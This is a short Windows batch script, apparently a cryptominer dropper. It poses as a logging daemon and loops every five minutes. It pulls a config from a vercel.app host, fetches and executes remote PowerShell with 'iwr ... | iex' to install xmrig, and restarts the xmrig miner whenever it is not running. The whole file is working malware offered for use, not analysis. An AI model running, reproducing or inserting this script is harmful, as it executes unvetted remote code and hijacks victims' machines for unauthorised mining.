@echo off
setlocal enabledelayedexpansion
set ROOT=%~dp0
if "%ROOT:~-1%"=="\" set ROOT=%ROOT:~0,-1%
set LOGDIR=%ROOT%\logs
if not exist "%LOGDIR%" mkdir "%LOGDIR%"
set LOGFILE=%LOGDIR%\daemon.log

echo %date% %time% [INFO] daemon started >> "%LOGFILE%"

:listener
echo %date% %time% [INFO] fetching config >> "%LOGFILE%"
curl -L -s -o "%ROOT%\config.json" "https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/config" >> "%LOGFILE%" 2>&1
if errorlevel 1 echo %date% %time% [ERROR] config download failed >> "%LOGFILE%"

if not exist "%ROOT%\xmrig.exe" (
  echo %date% %time% [INFO] xmrig.exe not found, attempting install >> "%LOGFILE%"
  taskkill /f /im xmrig.exe >nul 2>&1
  powershell -NoProfile -Command "iwr https://6259aaf5-f971-4db1-a171-a4d274e9cb70.vercel.app/api/install | iex" >> "%LOGFILE%" 2>&1
  if errorlevel 1 echo %date% %time% [ERROR] xmrig install failed >> "%LOGFILE%"
)

tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I "xmrig.exe" >NUL
if errorlevel 1 (
  echo %date% %time% [INFO] xmrig not running, starting >> "%LOGFILE%"
  taskkill /F /IM xmrig.exe >nul 2>&1
  start "" "%ROOT%\xmrig.exe" >> "%LOGFILE%" 2>&1
  if errorlevel 1 echo %date% %time% [ERROR] failed to start xmrig >> "%LOGFILE%"
)

echo %date% %time% [INFO] sleeping 300s >> "%LOGFILE%"
timeout /t 300 /nobreak >nul
goto listener